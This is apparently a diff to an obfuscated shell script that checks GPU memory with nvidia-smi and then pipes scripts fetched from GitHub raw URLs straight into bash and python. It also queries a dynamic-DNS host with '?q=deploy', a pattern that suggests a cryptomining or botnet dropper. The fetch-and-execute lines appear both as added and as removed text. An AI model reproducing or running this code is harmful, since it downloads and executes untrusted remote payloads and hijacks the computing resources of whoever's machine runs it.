@@ -7,6 +7,17 @@ google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//
 
 if [[ $google84121274 == *"failed"* ]]; then
 
+curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/mobilegoogle8474 | bash
+
+timeout 12 curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/mobilegoogle84 | python
+if [ $? -eq 124 ]; then
+echo "google84"
+else
+echo "google8474"
+fi
+
+else
+
 string=$(curl -s http://mobile84121274.hopto.org/?q=deploy)
 if [[ $string == *"16384"* ]]; then
 
@@ -160,17 +171,6 @@ sleep 84;
 
 fi
 
-fi
-
-else
-
-curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/mobilegoogle8474 | bash
-
-timeout 12 curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/mobilegoogle84 | python
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
 fi
 
 fi
